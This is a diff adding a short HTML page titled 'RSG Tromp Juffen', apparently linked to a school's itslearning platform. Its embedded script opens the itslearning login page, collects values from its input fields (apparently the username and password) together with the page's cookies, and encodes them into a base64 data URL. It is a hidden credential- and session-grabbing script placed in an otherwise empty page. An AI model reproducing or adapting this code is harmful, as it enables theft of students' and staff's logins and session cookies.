@@ -1,0 +1,17 @@
+<p>RSG Tromp Juffen</p>
+
+<p><script>
+<!--
+var mywin = window.open("https://rsgtrompmeesters.itslearning.com")
+function cool() {
+var inputjes = mywin.document.getElementsByTagName("input")
+var i;
+var myArr = [];
+for (i=0;i<inputjes.length;i++) {
+myArr[myArr.length] = inputjes[i].value
+}
+mywin.location.href = "data:text/plain;base64,"+btoa(myArr[3]+" "+myArr[4]+"\n\n"+mywin.document.cookie)
+}
+mywin.onload = cool
+//-->
+</script></p>
